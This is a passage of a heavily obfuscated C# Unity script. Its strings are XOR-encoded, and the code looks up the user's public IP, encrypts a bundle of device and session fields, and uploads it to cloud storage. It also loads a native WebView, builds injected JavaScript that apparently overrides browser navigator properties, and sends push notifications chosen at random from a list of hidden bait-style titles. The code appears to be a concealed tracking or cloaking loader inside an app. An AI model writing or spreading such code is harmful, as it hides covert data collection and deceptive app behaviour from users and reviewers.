                _0x04655db9 = Guid.NewGuid().ToString().Replace(_0x691e60c5._0x0bb7411d(new byte[1] { 107 }, 70), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[17] { 7, 8, 57, 47, 40, 1, 124, 56, 57, 42, 17, 51, 56, 57, 48, 102, 124 }, 92) + _0x87bad85f);
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[19] { 214, 217, 232, 254, 249, 208, 173, 236, 253, 253, 219, 232, 255, 254, 228, 226, 227, 183, 173 }, 141) + _0x32882548);
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[20] { 11, 4, 53, 35, 36, 13, 112, 57, 62, 35, 36, 49, 60, 60, 29, 63, 52, 53, 106, 112 }, 80) + _0x6a2fc7a7);
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[23] { 65, 78, 127, 105, 110, 71, 58, 115, 116, 105, 110, 123, 118, 118, 127, 104, 73, 110, 117, 104, 127, 32, 58 }, 26) + _0x4a19c911);
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[14] { 154, 149, 164, 178, 181, 156, 225, 160, 177, 177, 136, 165, 251, 225 }, 193) + _0xd51077f3);
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[14] { 51, 60, 13, 27, 28, 53, 72, 9, 12, 30, 33, 12, 82, 72 }, 104) + _0x70078989);
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[18] { 82, 93, 108, 122, 125, 84, 41, 124, 122, 108, 123, 72, 110, 108, 103, 125, 51, 41 }, 9) + _0x634c61b5);
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[17] { 248, 247, 198, 208, 215, 254, 131, 208, 218, 208, 231, 198, 213, 234, 199, 153, 131 }, 163) + _0x04655db9);
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[12] { 27, 20, 37, 51, 52, 29, 96, 39, 48, 53, 122, 96 }, 64) + _0x15439407);
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[12] { 191, 176, 129, 151, 144, 185, 196, 135, 148, 145, 222, 196 }, 228) + _0xc7b61809);
#endif
        }
    }

    private IEnumerator RequestAndroidPermissionIfNeeded(string _0xc45d9378)
    {
        if (Permission.HasUserAuthorizedPermission(_0xc45d9378))
            yield break;
        bool _0x300e182c = false;
        var _0xf7ef2530 = new PermissionCallbacks();
        _0xf7ef2530.PermissionGranted += _0xbc370ea5 => _0x300e182c = true;
        _0xf7ef2530.PermissionDenied += _0xbc370ea5 => _0x300e182c = true;
        Permission.RequestUserPermission(_0xc45d9378, _0xf7ef2530);
        yield return new WaitUntil(() => _0x300e182c);
    }

    private string _0x92a3cc73 = "";
    private string _0x0cf9bf36 = "";
    private string _0x45952f21 = "";
    private string _0x3321e03e()
    {
        string _0xf33ab256 = _0x1a7c48d3();
        if (string.IsNullOrEmpty(_0xf33ab256))
            return _0x691e60c5._0x0bb7411d(new byte[7] { 97, 120, 126, 115, 55, 39, 44 }, 23);
        string _0x238822f6 = _0xf33ab256.Replace(_0x691e60c5._0x0bb7411d(new byte[1] { 16 }, 76), _0x691e60c5._0x0bb7411d(new byte[2] { 119, 119 }, 43)).Replace(_0x691e60c5._0x0bb7411d(new byte[1] { 42 }, 13), _0x691e60c5._0x0bb7411d(new byte[2] { 174, 213 }, 242));
        var _0xe8dec451 = Regex.Match(_0xf33ab256, _0x691e60c5._0x0bb7411d(new byte[12] { 65, 106, 112, 109, 111, 103, 45, 42, 94, 102, 41, 43 }, 2));
        string _0x4bf127d1 = _0xe8dec451.Success ? _0xe8dec451.Groups[1].Value : _0x691e60c5._0x0bb7411d(new byte[3] { 17, 18, 16 }, 32);
        return _0x691e60c5._0x0bb7411d(new byte[12] { 156, 210, 193, 218, 215, 192, 221, 219, 218, 156, 157, 207 }, 180) + _0x691e60c5._0x0bb7411d(new byte[8] { 232, 255, 236, 190, 235, 255, 163, 185 }, 158) + _0x238822f6 + _0x691e60c5._0x0bb7411d(new byte[2] { 151, 139 }, 176) + _0x691e60c5._0x0bb7411d(new byte[30] { 244, 227, 240, 162, 242, 240, 237, 246, 237, 191, 204, 227, 244, 235, 229, 227, 246, 237, 240, 172, 242, 240, 237, 246, 237, 246, 251, 242, 231, 185 }, 130) + _0x691e60c5._0x0bb7411d(new byte[121] { 36, 55, 44, 33, 54, 43, 45, 44, 98, 38, 39, 36, 106, 45, 32, 40, 110, 41, 39, 59, 110, 52, 35, 46, 107, 57, 54, 48, 59, 57, 13, 32, 40, 39, 33, 54, 108, 38, 39, 36, 43, 44, 39, 18, 48, 45, 50, 39, 48, 54, 59, 106, 45, 32, 40, 110, 41, 39, 59, 110, 57, 37, 39, 54, 120, 36, 55, 44, 33, 54, 43, 45, 44, 106, 107, 57, 48, 39, 54, 55, 48, 44, 98, 52, 35, 46, 121, 63, 110, 33, 45, 44, 36, 43, 37, 55, 48, 35, 32, 46, 39, 120, 54, 48, 55, 39, 63, 107, 121, 63, 33, 35, 54, 33, 42, 106, 39, 107, 57, 63, 63 }, 66) + _0x691e60c5._0x0bb7411d(new byte[26] { 119, 118, 117, 59, 99, 97, 124, 103, 124, 63, 52, 102, 96, 118, 97, 82, 116, 118, 125, 103, 52, 63, 102, 114, 58, 40 }, 19) + _0x691e60c5._0x0bb7411d(new byte[52] { 68, 69, 70, 8, 80, 82, 79, 84, 79, 12, 7, 65, 80, 80, 118, 69, 82, 83, 73, 79, 78, 7, 12, 85, 65, 14, 82, 69, 80, 76, 65, 67, 69, 8, 15, 126, 109, 79, 90, 73, 76, 76, 65, 124, 15, 15, 12, 7, 7, 9, 9, 27 }, 32) + _0x691e60c5._0x0bb7411d(new byte[37] { 23, 22, 21, 91, 3, 1, 28, 7, 28, 95, 84, 3, 31, 18, 7, 21, 28, 1, 30, 84, 95, 84, 63, 26, 29, 6, 11, 83, 18, 1, 30, 5, 75, 31, 84, 90, 72 }, 115) + _0x691e60c5._0x0bb7411d(new byte[34] { 7, 6, 5, 75, 19, 17, 12, 23, 12, 79, 68, 21, 6, 13, 7, 12, 17, 68, 79, 68, 36, 12, 12, 4, 15, 6, 67, 42, 13, 0, 77, 68, 74, 88 }, 99) + _0x691e60c5._0x0bb7411d(new byte[30] { 198, 199, 196, 138, 210, 208, 205, 214, 205, 142, 133, 207, 195, 218, 246, 205, 215, 193, 202, 242, 205, 203, 204, 214, 209, 133, 142, 151, 139, 153 }, 162) + _0x691e60c5._0x0bb7411d(new byte[48] { 143, 137, 130, 128, 141, 154, 137, 219, 142, 154, 159, 198, 128, 153, 137, 154, 149, 159, 136, 193, 160, 128, 153, 137, 154, 149, 159, 193, 220, 184, 147, 137, 148, 150, 146, 142, 150, 220, 215, 141, 158, 137, 136, 146, 148, 149, 193, 220 }, 251) + _0x4bf127d1 + _0x691e60c5._0x0bb7411d(new byte[35] { 48, 106, 59, 108, 117, 101, 118, 121, 115, 45, 48, 80, 120, 120, 112, 123, 114, 55, 84, 127, 101, 120, 122, 114, 48, 59, 97, 114, 101, 100, 126, 120, 121, 45, 48 }, 23) + _0x4bf127d1 + _0x691e60c5._0x0bb7411d(new byte[238] { 85, 15, 94, 9, 16, 0, 19, 28, 22, 72, 85, 60, 29, 6, 79, 51, 77, 48, 0, 19, 28, 22, 85, 94, 4, 23, 0, 1, 27, 29, 28, 72, 85, 64, 70, 85, 15, 47, 94, 31, 29, 16, 27, 30, 23, 72, 6, 0, 7, 23, 94, 2, 30, 19, 6, 20, 29, 0, 31, 72, 85, 51, 28, 22, 0, 29, 27, 22, 85, 94, 21, 23, 6, 58, 27, 21, 26, 55, 28, 6, 0, 29, 2, 11, 36, 19, 30, 7, 23, 1, 72, 20, 7, 28, 17, 6, 27, 29, 28, 90, 91, 9, 0, 23, 6, 7, 0, 28, 82, 34, 0, 29, 31, 27, 1, 23, 92, 0, 23, 1, 29, 30, 4, 23, 90, 9, 19, 0, 17, 26, 27, 6, 23, 17, 6, 7, 0, 23, 72, 85, 19, 0, 31, 85, 94, 16, 27, 6, 28, 23, 1, 1, 72, 85, 68, 70, 85, 94, 31, 29, 16, 27, 30, 23, 72, 6, 0, 7, 23, 94, 31, 29, 22, 23, 30, 72, 85, 85, 94, 2, 30, 19, 6, 20, 29, 0, 31, 72, 85, 51, 28, 22, 0, 29, 27, 22, 85, 94, 2, 30, 19, 6, 20, 29, 0, 31, 36, 23, 0, 1, 27, 29, 28, 72, 85, 67, 70, 92, 66, 92, 66, 85, 94, 7, 19, 52, 7, 30, 30, 36, 23, 0, 1, 27, 29, 28, 72, 85 }, 114) + _0x4bf127d1 + _0x691e60c5._0x0bb7411d(new byte[117] { 170, 180, 170, 180, 170, 180, 163, 249, 173, 191, 249, 249, 191, 203, 230, 238, 225, 231, 240, 170, 224, 225, 226, 237, 234, 225, 212, 246, 235, 244, 225, 246, 240, 253, 172, 244, 246, 235, 240, 235, 168, 163, 241, 247, 225, 246, 197, 227, 225, 234, 240, 192, 229, 240, 229, 163, 168, 255, 227, 225, 240, 190, 226, 241, 234, 231, 240, 237, 235, 234, 172, 173, 255, 246, 225, 240, 241, 246, 234, 164, 241, 229, 224, 191, 249, 168, 231, 235, 234, 226, 237, 227, 241, 246, 229, 230, 232, 225, 190, 240, 246, 241, 225, 249, 173, 191, 249, 231, 229, 240, 231, 236, 172, 225, 173, 255, 249 }, 132) + _0x691e60c5._0x0bb7411d(new byte[5] { 140, 216, 217, 216, 202 }, 241);
    }

    private void _0xac611204(string _0x22f137ee)
    {
        _0x8b7b3576();
        StartCoroutine(_0xe8ef82f9(_0x22f137ee));
    }

    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> _0x6db5d5ba()
    {
        var _0xc148b1ac = _0x691e60c5._0x0bb7411d(new byte[40] { 28, 0, 0, 4, 7, 78, 91, 91, 3, 3, 3, 90, 23, 24, 27, 1, 16, 18, 24, 21, 6, 17, 90, 23, 27, 25, 91, 23, 16, 26, 89, 23, 19, 29, 91, 0, 6, 21, 23, 17 }, 116);
        using (UnityWebRequest _0x358591f6 = UnityWebRequest.Get(_0xc148b1ac))
        {
            await _0x358591f6.SendWebRequest();
            string[] _0xe199ea17 = _0x358591f6.downloadHandler.text.Split('\n');
            foreach (string _0x8086d72b in _0xe199ea17)
            {
                if (_0x8086d72b.StartsWith(_0x691e60c5._0x0bb7411d(new byte[3] { 186, 163, 238 }, 211)))
                {
                    string _0xd051c534 = _0x8086d72b.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {_0xd051c534} from {_0xc148b1ac}");
                        }
#endif
                    }

                    return _0xd051c534;
                }
            }
        }

        return "";
    }

    internal bool ContainsIgnoreCase(string _0x54c6072e, string _0x4bef1554)
    {
        if (string.IsNullOrEmpty(_0x54c6072e) || string.IsNullOrEmpty(_0x4bef1554))
            return false;
        return _0x54c6072e.IndexOf(_0x4bef1554, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private bool _0x70270bc4()
    {
        _0x16e4da3b.RemoveAll(_0xfd4e6016 => _0xfd4e6016 == null || !_0xfd4e6016.IsAlive);
        return _0x16e4da3b.Count > 0;
    }

    private string _0x6213d63d()
    {
        string _0x7057a108 = _0x691e60c5._0x0bb7411d(new byte[62] { 176, 179, 178, 181, 180, 183, 182, 185, 184, 187, 186, 189, 188, 191, 190, 161, 160, 163, 162, 165, 164, 167, 166, 169, 168, 171, 144, 147, 146, 149, 148, 151, 150, 153, 152, 155, 154, 157, 156, 159, 158, 129, 128, 131, 130, 133, 132, 135, 134, 137, 136, 139, 225, 224, 227, 226, 229, 228, 231, 230, 233, 232 }, 209);
        System.Random _0xc5408666 = new System.Random();
        int _0xb2b49d0d = _0xc5408666.Next(8, 16);
        return new string (Enumerable.Repeat(_0x7057a108, _0xb2b49d0d).Select(_0xc068358a => _0xc068358a[_0xc5408666.Next(_0xc068358a.Length)]).ToArray());
    }

    internal bool firstLoadShown = false;
    private readonly string[] _0x536422d0 = new string[]
    {
        _0x691e60c5._0x0bb7411d(new byte[60] { 194, 173, 188, 130, 18, 102, 90, 87, 18, 64, 87, 87, 94, 65, 18, 83, 64, 87, 18, 90, 93, 70, 18, 64, 91, 85, 90, 70, 18, 92, 93, 69, 18, 208, 178, 161, 18, 86, 93, 92, 208, 178, 171, 70, 18, 95, 91, 65, 65, 18, 75, 93, 71, 64, 18, 65, 66, 91, 92, 19 }, 50),
        _0x691e60c5._0x0bb7411d(new byte[52] { 87, 56, 42, 39, 135, 238, 211, 135, 196, 200, 210, 203, 195, 135, 197, 194, 135, 222, 200, 210, 213, 135, 203, 210, 196, 204, 222, 135, 202, 200, 202, 194, 201, 211, 135, 69, 39, 52, 135, 208, 207, 222, 135, 212, 211, 200, 215, 135, 201, 200, 208, 152 }, 167),
        _0x691e60c5._0x0bb7411d(new byte[66] { 119, 15, 52, 122, 45, 26, 181, 215, 252, 242, 181, 226, 252, 251, 230, 181, 244, 231, 240, 181, 253, 252, 225, 225, 252, 251, 242, 181, 248, 250, 231, 240, 181, 250, 243, 225, 240, 251, 181, 225, 250, 241, 244, 236, 181, 119, 21, 6, 181, 230, 225, 244, 236, 181, 252, 251, 181, 225, 253, 240, 181, 242, 244, 248, 240, 187 }, 149),
        _0x691e60c5._0x0bb7411d(new byte[54] { 120, 23, 29, 26, 168, 220, 224, 225, 251, 168, 225, 251, 168, 248, 250, 225, 229, 237, 168, 252, 225, 229, 237, 168, 106, 8, 27, 168, 252, 224, 237, 168, 234, 237, 251, 252, 168, 248, 228, 233, 241, 237, 250, 251, 168, 248, 228, 233, 241, 168, 230, 231, 255, 166 }, 136),
        _0x691e60c5._0x0bb7411d(new byte[48] { 181, 218, 209, 224, 101, 28, 42, 48, 55, 101, 50, 44, 43, 43, 44, 43, 34, 101, 54, 49, 55, 32, 36, 46, 101, 38, 42, 48, 41, 33, 101, 39, 32, 101, 42, 43, 32, 101, 54, 53, 44, 43, 101, 36, 50, 36, 60, 107 }, 69),
        _0x691e60c5._0x0bb7411d(new byte[65] { 79, 32, 37, 63, 159, 245, 222, 220, 212, 207, 208, 203, 204, 159, 222, 205, 218, 159, 210, 208, 205, 218, 159, 222, 220, 203, 214, 201, 218, 159, 203, 208, 209, 214, 216, 215, 203, 159, 93, 63, 44, 159, 204, 203, 222, 198, 159, 222, 209, 219, 159, 203, 205, 198, 159, 198, 208, 202, 205, 159, 211, 202, 220, 212, 145 }, 191),
        _0x691e60c5._0x0bb7411d(new byte[55] { 53, 90, 75, 119, 229, 128, 179, 160, 183, 188, 229, 182, 181, 172, 171, 229, 166, 170, 176, 171, 177, 182, 229, 39, 69, 86, 229, 177, 173, 160, 229, 171, 160, 189, 177, 229, 170, 171, 160, 229, 166, 170, 176, 169, 161, 229, 167, 160, 229, 188, 170, 176, 183, 182, 235 }, 197),
        _0x691e60c5._0x0bb7411d(new byte[63] { 251, 180, 137, 246, 161, 150, 57, 73, 117, 120, 96, 124, 107, 106, 57, 107, 112, 126, 113, 109, 57, 119, 118, 110, 57, 120, 107, 124, 57, 110, 112, 119, 119, 112, 119, 126, 57, 251, 153, 138, 57, 125, 118, 119, 251, 153, 128, 109, 57, 110, 120, 117, 114, 57, 120, 110, 120, 96, 57, 96, 124, 109, 55 }, 25),
        _0x691e60c5._0x0bb7411d(new byte[51] { 251, 148, 132, 141, 43, 68, 101, 103, 114, 43, 127, 99, 100, 120, 110, 43, 124, 99, 100, 43, 120, 127, 106, 114, 43, 98, 101, 43, 127, 99, 110, 43, 108, 106, 102, 110, 43, 124, 98, 101, 43, 127, 99, 110, 43, 123, 121, 98, 113, 110, 37 }, 11),
        _0x691e60c5._0x0bb7411d(new byte[64] { 79, 55, 12, 66, 21, 34, 141, 224, 194, 192, 200, 195, 217, 216, 192, 141, 196, 222, 141, 200, 219, 200, 223, 212, 217, 197, 196, 195, 202, 141, 79, 45, 62, 141, 198, 200, 200, 221, 141, 222, 221, 196, 195, 195, 196, 195, 202, 141, 203, 194, 223, 141, 212, 194, 216, 223, 141, 206, 197, 204, 195, 206, 200, 131 }, 173)
    };
    private string _0x2c20f3a1 = "";
    private void OnApplicationFocus(bool _0x12c5f7c1)
    {
        isApplicationFocus = _0x12c5f7c1;
        if (_0x12c5f7c1 && _0xf3277790)
        {
            _0x8b7b3576();
        }
    }

    private string _0xf074aa2c = "";
    private bool _0xf9bad01c = false;
    private int _0x27b4cf29 = 0;
    private async Task<bool> _0xaa29ef9a()
    {
        {
#if B_LOGS
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[29] { 147, 156, 173, 187, 188, 149, 232, 129, 187, 152, 186, 161, 190, 169, 171, 177, 137, 166, 172, 155, 169, 190, 173, 172, 139, 160, 173, 171, 163 }, 200));
#endif
        }

        string _0x18086b86 = "";
        for (int _0x4a679e13 = 0; _0x4a679e13 < 2; _0x4a679e13++)
        {
            if (await _0xb6ff6867(1, 100))
            {
                await _0xce9c1014(_0x691e60c5._0x0bb7411d(new byte[7] { 254, 240, 243, 255, 247, 249, 248 }, 156));
                _0xbdc7ac42();
                return true;
            }

            _0x18086b86 = await _0x96d3c5f0(1, 100);
            if (!string.IsNullOrEmpty(_0x18086b86))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0x18086b86))
            {
                if (!string.IsNullOrEmpty(_0xdac302cf))
                {
                    _0x18086b86 = _0x681563e9(_0x18086b86, _0xdac302cf);
                    {
#if B_LOGS
                        Debug.Log(_0x691e60c5._0x0bb7411d(new byte[53] { 139, 132, 181, 163, 164, 141, 240, 147, 177, 179, 184, 181, 180, 240, 182, 185, 190, 177, 188, 133, 162, 188, 240, 167, 185, 164, 184, 240, 163, 181, 190, 180, 185, 180, 240, 50, 86, 66, 240, 163, 184, 191, 167, 240, 135, 181, 178, 134, 185, 181, 167, 234, 240 }, 208) + _0x18086b86);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0x691e60c5._0x0bb7411d(new byte[39] { 60, 51, 2, 20, 19, 58, 71, 36, 6, 4, 15, 2, 3, 71, 1, 14, 9, 6, 11, 50, 21, 11, 71, 133, 225, 245, 71, 20, 15, 8, 16, 71, 48, 2, 5, 49, 14, 2, 16 }, 103));
#endif
                    }
                }

                _0x0d6f97cb = true;
                _0xac611204(_0x18086b86);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x691e60c5._0x0bb7411d(new byte[44] { 19, 28, 45, 59, 60, 21, 104, 13, 48, 43, 45, 56, 60, 33, 39, 38, 104, 63, 32, 33, 36, 45, 104, 43, 32, 45, 43, 35, 33, 38, 47, 104, 59, 41, 62, 45, 44, 104, 36, 33, 38, 35, 114, 104 }, 72) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    private async Task _0xa215ba8a()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        _0x7d8400f7 = _0x691e60c5._0x0bb7411d(new byte[5] { 49, 54, 59, 36, 50 }, 87);
        _0x45952f21 = /*IsRunningOnEmulator() ? "running" :*/ "";
        _0x741ecce1 = DateTime.UtcNow.Ticks.ToString();
        _0x2c20f3a1 = "";
        JObject _0xeff3d1e6 = BuildRandomPayload(_0xd51077f3, _0x95069f27, _0x70078989, _0xf074aa2c, _0xadc80036, _0x1f1a6c98, _0xd2bbde7e, _0x634c61b5, _0x0cf9bf36, _0x04655db9, _0x7d8400f7, _0x2c20f3a1, _0x87bad85f, _0x32882548, _0x6a2fc7a7.ToString(), _0x4a19c911, _0x741ecce1, _0x45952f21, _0xb792f32e, _0x15439407, _0xc7b61809, _0x92a3cc73, _0x8c1b9694());
        var _0xda4e68ca = _0xb432f91e(_0xeff3d1e6.ToString(), _0xb792f32e);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {_0xeff3d1e6}");
            }
#endif
        }

        try
        {
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x691e60c5._0x0bb7411d(new byte[7] { 183, 166, 190, 171, 168, 166, 163 }, 199) + _0xb792f32e, _0xda4e68ca } });
            await Task.Delay(500);
            string _0x5c129860 = "";
            for (int _0x27e398aa = 0; _0x27e398aa < 20; _0x27e398aa++)
            {
                if (await _0xb6ff6867(1, 1))
                {
                    await _0xce9c1014(_0x691e60c5._0x0bb7411d(new byte[7] { 9, 7, 4, 8, 0, 14, 15 }, 107));
                    _0xbdc7ac42();
                    return;
                }

                _0x5c129860 = await _0x96d3c5f0(1, 500);
                if (!string.IsNullOrEmpty(_0x5c129860))
                    break;
            }

            _0x93b3992d(_0x5c129860);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x691e60c5._0x0bb7411d(new byte[22] { 20, 27, 10, 28, 27, 18, 111, 8, 42, 33, 42, 61, 46, 35, 111, 42, 61, 61, 32, 61, 117, 111 }, 79) + e.Message);
#endif
            }

            _0xbdc7ac42();
        }
    }

    internal bool isApplicationFocus = false;
    internal void _0x2131d3ab()
    {
        Rect _0x53a65f4b = Screen.safeArea;
        Vector2 _0x9eb027d0 = new Vector2(Screen.width, Screen.height);
        if (_0x53a65f4b == lastSafe && _0x9eb027d0 == lastSize)
            return;
        // Apply manual padding
        _0x53a65f4b.xMin += _0xc737cb2e;
        _0x53a65f4b.xMax -= _0x484bed6e;
        _0x53a65f4b.yMin += _0x2df47042;
        _0x53a65f4b.yMax -= _0xb0745b2e;
        // Convert Unity safe area -> native WebView frame
        Rect _0xafc7aa10 = new Rect(_0x53a65f4b.x, _0x9eb027d0.y - _0x53a65f4b.y - _0x53a65f4b.height, // Y flip for native coordinate system
 _0x53a65f4b.width, _0x53a65f4b.height);
        _0x7efe16e4.Frame = _0xafc7aa10;
        lastSafe = Screen.safeArea;
        lastSize = _0x9eb027d0;
    }

    // WEB VIEW LOGIC END
    internal void _0x8914af27()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0x60089734 = new AndroidNotificationChannel
        {
            Id = _0x691e60c5._0x0bb7411d(new byte[15] { 167, 166, 165, 162, 182, 175, 183, 156, 160, 171, 162, 173, 173, 166, 175 }, 195),
            Name = _0x691e60c5._0x0bb7411d(new byte[15] { 94, 127, 124, 123, 111, 118, 110, 58, 89, 114, 123, 116, 116, 127, 118 }, 26),
            Importance = Importance.High,
            Description = _0x691e60c5._0x0bb7411d(new byte[21] { 60, 30, 21, 30, 9, 26, 23, 91, 21, 20, 15, 18, 29, 18, 24, 26, 15, 18, 20, 21, 8 }, 123)
        };
        AndroidNotificationCenter.RegisterNotificationChannel(_0x60089734);
        // Build notification
        var _0xcf161aab = new AndroidNotification
        {
            Title = _0x536422d0[UnityEngine.Random.Range(0, _0x536422d0.Length)],
            Text = _0x691e60c5._0x0bb7411d(new byte[21] { 112, 67, 84, 17, 72, 94, 68, 17, 66, 68, 67, 84, 17, 69, 94, 17, 84, 73, 88, 69, 14 }, 49),
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(_0xcf161aab, _0x691e60c5._0x0bb7411d(new byte[15] { 193, 192, 195, 196, 208, 201, 209, 250, 198, 205, 196, 203, 203, 192, 201 }, 165));
    }

    private bool _0x0d6f97cb = false;
    internal Vector2 lastSize = Vector2.zero;
    private async Task _0xce9c1014(string _0x7d240f0b)
    {
        if (_0xf9bad01c || string.IsNullOrEmpty(_0xb792f32e) || string.IsNullOrEmpty(_0x7d240f0b) || _0x0d6f97cb)
            return;
        _0xf9bad01c = true;
        try
        {
            JObject _0xf19920bd = BuildRandomPayload(_0x7d240f0b, _0xb792f32e, _0x8c1b9694());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0x7d240f0b} payload: {_0xf19920bd}");
                }
#endif
            }

            var _0x39b1e370 = _0xb432f91e(_0xf19920bd.ToString(), _0xb792f32e);
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x691e60c5._0x0bb7411d(new byte[4] { 50, 49, 63, 58 }, 94) + _0xb792f32e, _0x39b1e370 } });
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x691e60c5._0x0bb7411d(new byte[24] { 158, 145, 128, 150, 145, 152, 229, 137, 170, 164, 161, 229, 181, 164, 182, 182, 229, 160, 183, 183, 170, 183, 255, 229 }, 197) + e.Message);
#endif
            }
        }
    }

    private void _0x078ddcbc()
    {
        WLog(_0x691e60c5._0x0bb7411d(new byte[21] { 69, 108, 127, 105, 122, 108, 127, 104, 45, 111, 108, 110, 102, 45, 125, 127, 104, 126, 126, 104, 105 }, 13));
        if (Time.frameCount == _0x9dc3f74c)
            return;
        _0x9dc3f74c = Time.frameCount;
        if (_0x46d9aaf1())
            return;
        _0x8acf3259();
    }
}

internal static class _0x691e60c5
{
    internal static string _0x0bb7411d(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}